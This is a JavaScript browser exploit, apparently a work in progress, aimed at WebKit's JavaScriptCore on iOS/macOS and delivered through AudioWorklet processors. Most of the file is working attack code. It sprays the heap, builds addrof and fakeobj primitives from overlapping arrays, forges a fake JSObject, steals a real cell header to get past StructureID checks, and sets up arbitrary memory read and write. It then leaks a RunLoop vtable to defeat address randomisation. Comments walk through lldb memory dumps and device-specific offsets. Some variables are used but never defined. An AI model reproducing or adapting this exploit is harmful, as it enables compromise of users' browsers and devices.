//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//
function pad_left(s, c, n) {
    s_ = s;

    if (s_.length < n) {
        s_ = c.repeat(n - s_.length) + s_;
    }

    return s_;
}
function prim_hexdump(buf) {
    s = "";

    for (i = 0; i < buf.length; i++) {
        val = buf[i];
        s += pad_left(val.toString(16), "0", 2);
    }

    return s;
}


// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();


function ab2str(buf) {
  return String.fromCharCode.apply(null, new Uint16Array(buf));
}

function str2ab(str) {
  var buf = new ArrayBuffer(str.length*2); // 2 bytes for each char
  var bufView = new Uint16Array(buf);
  for (var i=0, strLen=str.length; i < strLen; i++) {
    bufView[i] = str.charCodeAt(i);
  }
  return buf;
}


   
//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfc))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0002000000000000, 0xfffc000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x2000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x2000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    this.lo = function()
    {
        var b = this.bytes();
        return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
    };

    this.hi = function()
    {
        var b = this.bytes();
        return (b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0;
    };

    this.asInt32 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 4) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };
    
    this.asInt16 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 2) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt('0x' + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

     // this = a ^ b
    this.assignXor = operation(function xor(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
        }
        return this;
    }, 2);
    

    // this = a << b
    this.assignShiftLeft = operation(function shiftLeft(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < b) {
                bytes[i] = 0;
            } else {
                bytes[i] = a.byteAt(Sub(i, b).asInt32());
            }
        }
        return this;
    }, 2);
    
    // this = a >> b
    this.assignShiftRight = operation(function shiftRight(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < (8 - b)) {
                bytes[i] = a.byteAt(Add(i, b).asInt32());
            } else {
                bytes[i] = 0;
            }
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a ^ b
function Xor(a, b) {
    return (new Int64()).assignXor(a, b);
}

// Return a << b
function ShiftLeft(a, b) {
    return (new Int64()).assignShiftLeft(a, b);
}

// Return a >> b
function ShiftRight(a, b) {
    return (new Int64()).assignShiftRight(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

// That's all the arithmetic we need for exploiting WebKit.. :)

function sleep( sleepDuration ){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
}
function gc1() {
    for (let i = 0; i < 0x10; i++) {
            new ArrayBuffer(0x1000000);
        }
}

function strcmp(b, str)
{
    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
    for(var i = 0; i < str.length; ++i)
    {
        if(fn(i) != str.charCodeAt(i))
        {
            
            return false;
        }
    }
    return fn(str.length) == 0;
}
function hex_to_ascii(str1)
 {
	var hex2  = str1.toString();
	var str = '';
	for (var n = 0; n < hex2.length; n += 2) {
		str += String.fromCharCode(parseInt(hex2.substr(n, 2), 16));
	}
	return str;
 }



      function hex1(x) {
    if (x < 0)
        return `-${hex1(-x)}`;
    return `0x${x.toString(16)}`;
}
let data_view = new DataView(new ArrayBuffer(8));
var floatAsQword = float => { //f2i
    data_view.setFloat64(0, float, true);
    var low = data_view.getUint32(0, true);
    var high = data_view.getUint32(4, true);
    return low + (high * 0x100000000);
}
var qwordAsTagged = qword =>{
    return qwordAsFloat( qword- 0x02000000000000);
}
var qwordAsFloat = qword => { //i2f
    data_view.setUint32(0, qword%0x100000000, true);
    data_view.setUint32(4, qword/0x100000000, true);
    //data_view.setBigUint64(0, qword);
    return data_view.getFloat64(0, true);
}
const kBoxedDoubleOffset = 0x0002000000000000n; //around ios 13 webkit no longer use 0x0001 - 0xfffe encoding for doubles and no longer adds +0x0001
//to JSValues instead now its 0x0002 added to js values and double now range from 0x0002-0xfffc  hence this boxed aka "JSValue" value is 0x0002

    /*var array_spray = []; // we make an array to hold our heap structure spray
    for (var i = 0; i < 1000; ++i) { //we will now spray 1000
        array_spray[i] = [13.37+i, 13.37];
    }*/ //useless now
    var structure_spray = []; //this is an empty array to hold our other spray array doubles from the heap
for (var i = 0; i < 1000; ++i) { //spray 1000 array no needed though it just better the odds
    var ary = [13.37]; //this make a ArrayWithDouble i think this also is Copy On Write 
    //ary[0] = 4.2 this changes it from Copy On Write to Non Copy on write?
    ary.prop = 13.37; //create an inline property which i also a Double
    ary['p'+i] = 13.37; //create another property 
    structure_spray.push(ary); // push these arrays to structure_spray
}
    //var unboxed1 = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37]; useless now
    //unboxed1[0] = 4.2; // no CopyOnWrite useless
  //alert("hehe") useless
      function boxDouble(d) {
        return d + kBoxedDoubleOffset;
      }
      function unboxDouble(d) {
        return d - kBoxedDoubleOffset;
      }
      // the structure ID is wrong, but we'll fix it :)
      let doubleArrayCellHeader = 0x0108230700000000n; //invalid headed but will be fixed later in exploit
      let f = new Float64Array(1);
      let u = new Uint32Array(f.buffer);
      function float2bigint(v) {
        f[0] = v;
        return BigInt(u[0]) | (BigInt(u[1]) << 32n);
      }
      function bigint2float(v) {
        u[0] = Number(v & 0xffffffffn);
        u[1] = Number(v >> 32n);
        return f[0];
      }
      // store things to prevent GC
      let keep = [];
      function gc(n=10000) {
        let tmp = [];
        for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
      }
      // message port to talk to main thread; will be set later
      let port = null;
      //let port1 = null;
      // will be implemented later
      let fakeobj = null;
      let addrof = null;
      for (var i = 0; i < 100; i++) keep.push([1.1*i]);
      let a0 = [0,0,0,0,0,0,0,0,0,0];

      let a1 = [0,0,0,0,0,0,0,0,0,0];
      // transition to unboxed double storage
      a1[3] = 13.37;
      let b0 = [0,0,0,0,0,0,0,0,0,0];
      let b1 = [{},{},13.37] //[0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
      // put zeroes in first two slots so JSCallbackData destruction is safe
      delete b1[0];
      delete b1[1];
      function setupPrimitives() {
        
        port.postMessage("setting up");
        if (a1.length != 0x1337) {
          port.postMessage("Failure on array length");
          return;
        }

        //const kSentinel = 1333.337;
        var kSentinel = qwordAsFloat(0x41414141414141) //magic value to find the right one
        let offset = -1;
        b1[0] = kSentinel; //set index 0 of b1 to 0x4141
        // scan for the sentinel to find the offset from a to b
        for (var i = 0; i < 0x100; i++) {
          if (qwordAsTagged(floatAsQword(a1[i])) == kSentinel) { //find the a1 array that overlaps b1[0] this will have the 0x4141 value
            port.postMessage("a1[i]" + typeof a1 + hex1(floatAsQword(qwordAsTagged(floatAsQword(a1[i])))))
            offset = i; //note the offset of the a1 array that overlaps b1 :)
            break;
          }
        }
        if (offset == -1) {
          port.postMessage("Failure finding offset");
          return;
        }
        //port.postMessage("here")
        // temporary implementations
	//now that we have an overlapping array one holding floats the other holding JSvalues we have constructed artificial type confusion
	//between JSValues and Floats so now we can fake an object with our float array and get an an relative read or aka addressof primitive
        addrof = (val) => { 
          b1[0] = val;
          return floatAsQword(a1[offset]);
        }
        fakeobj = (addr) => {
          a1[offset] = qwordAsFloat(addr);
          return b1[0];
        }
	//now that, that is done we can now pick our target for the purpose of crafing an arbitrary r/w primitive using addrof and fakeobj prims
        var victim1 = structure_spray[510]; //choose an array from our structureID spray earlier it will have an inline property with a double
	//that way we can simply read values from our inline prop "arbitrary read", and write to inline prop via another overlapping object 
	//"arbitrary write" ok anyways scratch what I said ever since gigacage mitagation every object that was truly capable of arb r/w
	//is now caged into a runway zone any access outside of it will crash the process hindering them useless as a target
	// the targets we are choosing or left with is JSObjects, and JSArrays. JSArrays in the eyes of JSC is another variant of JSObjects
	//as they can technically do the same thing such as hold inline props and store values and hold structures and structIDs
	//why aren't JS/Object or Arrays capable of arbitrary r/w well if our inline property can't reach a certain address or it isn't mapped
	//it'll definitely crash the process so for our r/w to work it has to be capable of reach with our hax and victim1 object...
	//making our primtives a type of limited arbitrary r/w and if you put it that way its technically not arbitrary...
	
        // Gigacage bypass: Forge a JSObject which has its butterfly pointing
        // to victim
	//Since we don't have a gigacage defeat 0 day nor want to waste or find one we can simply bypass it by playing by the rules
	//and only use what isn't gigacaged which are JSArrays aka JSObjects
        //var boxed1 = [{}];
        var print = (msg) => {
          port.postMessage(msg);
        }
        //print("unboxed @ " + new Int64(addrof(unboxed1)));
        //print("boxed @ " + new Int64(addrof(boxed1)));

    var container = { //here we are simply crafting a contianer to make it seem like a JSObject this will be our "JSCell" since all JSobjects
	//contain a JSCell to be a container for a header and a butterfly backing
	//all JSObjects have a header at offset 0 which store a structureID more on that later since we also have to defeat this mitagation
	//and a butterfly backing 
        header: qwordAsTagged(0x0108230900000000), //at offset 0 we have our header which tells JSC what type of object it is
	    //0x0108230700000000 tells JSC its an ArrayWithDoubles and 0x0108230900000000 tells JSC its an ArrayWithContigous
	    //contigous meaning it holds at least an object or an array with containing multiple values such as doubles,JSValues,Ints etc
	    //example var a = [13.37] will be ArrayWithDouble 0x0108230700000000
	    //example var a = [13.37,{}] or [{}] or [1.1,{},0x1234] all count as contigous 0x0108230900000000
	    //so here we are telling JSC our *Fake Object* is arraywithcotigous
        butterfly: victim1, // butterfly here we chose our victim or array from our structureID spray from earlier to be our butterfly backing
	    //for the soul purpose that victim1 has an inline property double value for r/w purposes
    };
	      //only legit float values can be read/written to
    //var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
    //unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
    //var boxed = [{}];

    print("container @ " + new Int64(addrof(container)));

    var hax = fakeobj(addrof(container) + 0x10); //hax will be our fakeobject which is just the victim1 arraywithdouble as a butterfly
	//if this works without crashing then we now have fakeobject "hax" that can now do arbitrary r/w
    print("we have hax object ;)");
    print("after further work we can use this object for arbitrary r/w");
    print("now lets steal a real JSCellHeader")
    // Can now simply read a legitimate JSCell header and use it.
	//also we are still not good and it prone to crash remember our cell header from earlier telling JSC we are ArrayWithCotigous well 
	//Webkit team added another mitagation to defeat just simply faking an object and then gaining r/w now it has to be a valid object or else
	//seem valid to avoid a crash; StructureID as a mitagation add bits to the CellHeader of any object that indicates its gc reference number if 
	//if its invalid that means the object is corrupted JSC eyes so either we have to A play by the rules and only use a real valid object or B a 
	//header then craft fake object race to not trigger gc() or JIT and steal a real cell header and make it our own 
	//Option A is feasible as we can't get arbitrary r/w that way so i guess B it is!
    //var js_header = hax[0]; not feasible anymore they added another factor to help with StructID mitagation by caching structureID list in 
    //JIT memory :(
    //container.header = js_header; 
    //print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
    
    // Can read/write to memory now by corrupting the butterfly
    // pointer of the float array.
    //hax[1] = 3.54484805889626e-310;    // 0x414141414141 in hex
    //victim1[0] = 1337;
	       container.header = jscell_header
//ok so simply stealing a header and using that isn't going to work as yes it'll pass gc test and wont crash but as soon as we trigger jit, jit will
	      //look into its cache and see that were fake and invalid and cause a crash
	      //so we can technically still steal a structureid or cell header but we also need to find a way to essentially clear the JIT Cache
	      //referencee https://googleprojectzero.blogspot.com/2020/09/jitsploitation-two.html
	      /*Running the current exploit would yield memory read/write, but would likely crash soon after 
	      when the garbage collector runs the next time and scans all reachable heap objects.

The general approach to achieve exploit stability is to keep all heap objects in a functioning state (one that will not cause the GC to crash when it 
scans the object and visits all outgoing pointers), or, if that is not possible, to repair them as soon as possible after corruption. 
In the case of this exploit, the fake_arr is initially “GC unsafe” as it contains an invalid StructureID. When its JSCell is later replaced with a 
valid one (container.jscell_header = jscell_header;) the faked object becomes “GC safe” as it appears like a valid JSArray to the GC.

However, there are some edge cases that can lead to corrupted data being stored in other places of the engine as well. For example, the array load 
in the previous JavaScript snippet (jscell_header = fake_arr[0];) will be performed by a get_by_val bytecode operation. This operation also keeps 
a cache of the last seen structure ID, which is used to build the value profiles relied on by the JIT compiler. This is problematic, as the 
structure ID of the faked JSArray is invalid and will thus lead to crashes, for example when the GC scans the bytecode caches. However, the fix is 
fortunately fairly easy: execute the same get_by_val op twice, the second time with a valid JSArray, whose StructureID will then be cached instead:
*/
	      //so according to projectzer0 we can clear the cache by performing get_by_val jit operation twice
    let results = [];
    for (let i = 0; i < 2; i++) { //trigger jit by performing same operation more than once
        let a = i == 0 ? hax : victim1; //perform logical get_by_val operation twice of 
	    //essentially in first loop itll grab our hax object because i will equal 0 so itll get hax object
	    //but the second time it will grab victim1 object essentially clearing the JITCache
        results.push(a[0]); //push the results to results array
    }
    var jscell_header = results[0]; //make jscell_header equal that of victim1
    print("Stolen Real Cell Header: " + new Int64.fromDouble(jscell_header))
//now we can set container to the real JSCellHeader so we wont ever crash :)

	      
      
    var stage2 = {
        addrof: function(obj) {
            return addrof(obj)
        },

        fakeobj: function(addr) {
            return fakeobj(addr)
        },

        write64: function(where, what) {
            hax[1] = qwordAsFloat(where + 0x10);
            victim1.prop = qwordAsFloat(what);
        },
	
	writeInt64: function(where, what) {
            //set_victim_addr(where)
	    hax[1] = qwordAsFloat(where + 0x10);
            victim1.prop = what.asDouble();
        },


        read64: function(where) {
            hax[1] = qwordAsFloat(where + 0x10);
            var res = floatAsQword(victim1.prop);
            //hax[1] = reset;
            //victim1.prop = shared_butterfly;
            return res;
        },
        readInt64: function(where) {
            if (where instanceof Int64) {
                where = Add(where, 0x10);
		hax[1] = where.asDouble();
	    } else {
		hax[1] = qwordAsFloat(where + 0x10);
	    }
            //hax[1] = qwordAsFloat(where + 0x10); //(Add(where , new Int64("0x10"))).asDouble();
            var res = floatAsQword(victim1.prop) //is this a double? //this.addrof(victim1.prop);
            //hax[1] = reset;
            //victim1.prop = shared_butterfly;
            return new Int64(res);
        },
        write(addr, data) {
            while (data.length % 4 != 0)
                data.push(0);

            var bytes = new Uint8Array(data);
            var ints = new Uint16Array(bytes.buffer);

            for (var i = 0; i < ints.length; i++)
                this.write64(Add(addr, 2 * i), ints[i]);
        },
        read(addr, length) {
	    //addr = new Int64(addr);
            var a = new Array(length);
            var i;
            var v;

            for (i = 0; i + 8 < length; i += 8) {
                v = new Int64(this.read64(addr + i)).bytes()
                for (var j = 0; j < 8; j++) {
                    a[i+j] = v[j];
                }
            }

            v = new Int64(this.read64(addr + i)).bytes()
            for (var j = i; j < length; j++) {
                a[j] = v[j - i];
            }

            return a

        },

        test: function() {
            var addr = this.addrof({a: 0x1337});
            var x = this.fakeobj(addr);
            port.postMessage(hex1(x.a))
            if (hex1(x.a) != 0x1337) {
                print('stage2 addrof/fakeobj does not work');
            }

            var val = 0x42424242;
            //this.write64(0x4141414141,0x999999999)
            //this.read64(0x999999)
            this.write64(shared_butterfly - 8, 0x42424242);
            print(hex1(floatAsQword(unboxed1[1])))
            if (qwordAsFloat(val) != unboxed1[1]) {
                print('stage2 write does not work');
            }

            if (this.read64(shared_butterfly + 8) != 0x42424242) {
                print('stage2 read does not work');
            }
        },

        clear: function() {
            outer = null;
            hax = null;
            for (var i = 0; i < unboxed_size; ++i)
                boxed1[i] = null;
            boxed1 = null
            unboxed1 = null
        },
    };
        print("we have arbitrary r/w with JSArray :)");
   	memory = stage2;
	print("~Turnerhackz1 shoutout to the best teacher ever for this vtable leak method :)");
	var a = {}
	//firstly we need to Calculate JSC::MarkedBlock::Footer or aka footer().vm()
	//JSC truncates everything to 32 bits so we need to truncate object address to a 32 bit address and do some math fucccckkkk
	//running lldb /System/Library/Frameworks/Versions/A/Helpers/jsc
	//then typing r to continue or run will yield us a JSC interpreter
	// if we run a = {} then run desrcibe(a) yields us this info 
	//>>> describe(a)
/*"Object: 0x12c4c0040 with butterfly 0x0(base=0xfffffffffffffff8) (Structure 0x12c429730:[0x2db8/11704, Object, (0/6, 0/0){}, NonArray, 
Proto:0x10a0253e8, Leaf]), StructureID: 11704"*/
	//as you can see our object addrss is 0x12c4c0040 lets perform math and 32 bit truncation on it 
	//BlockSize is iOS/macOS page size dependent for i6s and i7 and ipX i know its 0x4000 bytes large but anything after that is a guessing game
	//maybe can find out with p/x sizeof with lldb but havent tried it but i can confirm BlockSize in ios 12.1.4 i6s dyldsharedcache is 0x4000
	// p/x sizeof(JSC::MarkedBlock::Footer) yields 0x128 on debug builds but i think all devices are shipped with a release build version of webkit
	//0x128 seems to crash my idevices and my teacher told me that it for my device the offset is 0x130 so i tried that and it works so i guess
	// its 0x130 on releasebuilds or at least for ios 14.6
	// to calculate footer address aka JSC::MarkedBlock::Footer() 
	//footeraddr = "0x" + ((objaddr & 0xfffc0000) + (((bbaddr/0x100000000)|0)*0x100000000)+blocksize-footersize).toString(16);
	//on my device as describe our object address is 0x12c4c0040 which can be found with our addrof() primitives yielded this
	// footeraddr = "0x" + ((objaddr & 0xffffc000) + (((objaddr/0x100000000)|0)*0x100000000) + blockSize - footerSize).toString(16)
	//"0x12c4c3ed0"
	//pressing control c to exit jsc and back to lldb we can confirm this with lldb memory reads
	//our footeraddr should contains a segments of a bunch of zeroes that address contains our vm struct lets find out 
	/* (lldb) x/10gx 0x12c4c3ed0
0x12c4c3ed0: 0x0000000109004840 0x000000012c000000
0x12c4c3ee0: 0x000000012c003998 0xff1fff1f00000000
0x12c4c3ef0: 0x0000000000000000 0x0000000000000000
0x12c4c3f00: 0x0000000000000000 0x0000000000000000
0x12c4c3f10: 0x0000000000000000 0x0000000000000000
(lldb) # our vm struct is +0x8 from footeaddr 0x000000012c000000 
*/ 
	//as you can see our vmstruct on macos 12.3.1 jsc binary is at +0x8 this might be a different offset depending on device and version
	//0x000000012c000000 contains a whole bunch of zeroes so its definitely correct so lets read on this address
	/*(lldb) x/10gx 0x000000012c000000
0x12c000000: 0x0000000100000002 0x00000001090200c0
0x12c000010: 0x000000010900c100 0x00000000b1f15d16
0x12c000020: 0x5d26f673be00a5e3 0x6df5eb3d70828542
0x12c000030: 0xc000001c00000500 0x0000000000000000
0x12c000040: 0x0000000000000000 0x0000000000000001
*/ 
	//according to https://github.com/WebKit/WebKit/blob/releases/Apple/Safari-14.1.1-iOS-14.6/Source/JavaScriptCore/runtime/VM.h 
	//starting at line 337 we have 
	/*private:
    unsigned nextID(); skip 0x0 - 8

    static Atomic<unsigned> s_numberOfIDs; skip 0x8 - 0x10

    unsigned m_id; 0x0 - 0x8
    RefPtr<JSLock> m_apiLock; 0x8 - 0x10
    Ref<WTF::RunLoop> m_runLoop; 0x10 - 0x18 this is the address we want! to verify we can see that our address is followed by a bunch of random numbers
    if so then we have the right address lets look at it again

    WeakRandom m_random; 0x18 - 0x20 
    Integrity::Random m_integrityRandom; 0x20 - 0x30
*/
	/*(lldb) x/10gx 0x000000012c000000
0x12c000000: 0x0000000100000002 0x00000001090200c0 this is 0x0 - 0x8 then 0x8 - 0x10
0x12c000010: 0x000000010900c100 0x00000000b1f15d16 this is 0x10 - 0x18 then 0x18 - 0x20 0x18 -0x20 is m_random which is also random number :)
0x12c000020: 0x5d26f673be00a5e3 0x6df5eb3d70828542 this is 0x20 - 0x28 then 0x28 - 0x30 random numbers like i said :))))))
0x12c000030: 0xc000001c00000500 0x0000000000000000 so 0x10900c100 is our Ref<WTF::RunLoop> m_runLoop which is what we want:)
0x12c000040: 0x0000000000000000 0x0000000000000001*/
	//in the dyld shared cache there is a vtable for WTF::RunLoop hence why we want it so bad 
	//with an actual vtable leak you can use it to redirect control flow by overwriting it and calling a function of a vtable 
	// but there is no user callable vtable function that we can use so why are we so interested your wondering? because any vtable leak
	//leads to finding the base of said section it falls in which in this case its the __Data segment of JSC
	//                     __ZTVN3WTF7RunLoopE:        // vtable for WTF::RunLoop in a disassembler this is our vtable
	//so lets look into our m_runLoop to see what we have with lldb
	/*(lldb) x/10gx 0x000000010900c100
0x10900c100: 0x00708001e9ab0b10 0x0000000000000004 // offset 0x0 - 0x8 contains something interesting ;) its a signed vtable everything following is useless
0x10900c110: 0x0000000000000000 0x0000000000000000
0x10900c120: 0x0000000000000000 0x0000000000000000
0x10900c130: 0x0000000000000000 0x0000000000000000
0x10900c140: 0x0000000000000000 0x0000000000000000
*/
	//so as you can see m_runLoop contains a signed vtable address at offset 0 of the class which is expected in C++
	//every class whether public: or private: contains a vfptr or vptr at offset 0 which points to the vtable :)
	//as stated JSC does truncate everything down to 32 bits hence why the 48 bits and up is useless this is a 16 number hex address
	//each 4 numbers represents 16 bits, 16 x 4 sets of numbers = 64 bits so this address is 64 bits long so the upper 7 numbers are 28 bits
	//are completely useless so removing that we get 0x1e9ab0b10 which a 32 bit value. lets look into it:)
	
	/*(lldb) x/10gx 0x1e9ab0b10
0x1e9ab0b10: 0x49588001a8005788 0xbf058001a800578c
0x1e9ab0b20: 0xe5390001a80047bc 0x0000000000000000
0x1e9ab0b30: 0x0000000000000000 0x00748001a8005b44
0x1e9ab0b40: 0x8e508001a8005b48 0xfd5300018e9684c0
0x1e9ab0b50: 0x0000000000000000 0x0000000000000000
*/
	//dont know what this is but it looks like function prologues addresses represented by 64 bit which definitely looks correct :)
	//we can make it print 9 by two methods such as '0x'+0x00708001e9ab0b10.toString(16).slice(5) or 
	//truncate = (hexString) => '0x0000000' + hexString.slice(9);
	//truncate('0x00708001e9ab0b10');
	//lets give ios 14.6 a try at this same method shall we
	var objaddr = stage2.addrof(a);
	print("objaddr" + hex1(objaddr))
	var footeraddr = ((objaddr & 0xfffc0000) + (((objaddr/0x100000000)|0)*0x100000000)+0x4000-0x130);
	//refer to VM.h this is
        //JSC::MarkedBlock::footer at offset 8 should be the vm struct
	print("footeraddr @ " + footeraddr);
	var vmstruct = memory.read64(footeraddr+0x8);
	print("vmstruct @ " + hex1(vmstruct));
	var m_runloop = memory.read64(vmstruct+0x10);
	print("m_runloop @ " + hex1(m_runloop));
	//at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
        var vtable = stage2.read64(m_runloop);
        print("vtable @ " + hex1(vtable));


	
	      
	

      }
      function pwn() {
        try {
          setupPrimitives();
          // ensure we can survive GC
          //gc();
          // TODO: rest of exploit goes here
          port.postMessage("done!");
        } catch(e) { // send exception strings to main thread (for debugging)
          port.postMessage("Exception!!");
          port.postMessage(e.toString());
        }
      }
      registerProcessor("a", class {
        constructor() {
          // setup a message port to the main thread
          port = new AudioWorkletProcessor().port;
          //port1 = new AudioWorkletProcessor().port;
          port.onmessage = pwn;

          // this part is magic
          // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
          eval('1 + 0x1336');
          // overwrite a1's butterfly with a fastMalloc pointer
          return {fill: 1, a: a0};
        }
      });
      registerProcessor("b", class {
        constructor() {
            /*port.onmessage = (e) => {
                port1.postMessage("recieved!!!")
            }*/
            //port1 = new AudioWorkletProcessor().port;
          // overwrite b1's butterfly with a fastMalloc pointer
          return {fill: 1, b: b0};
        }
      });
      //return stage2
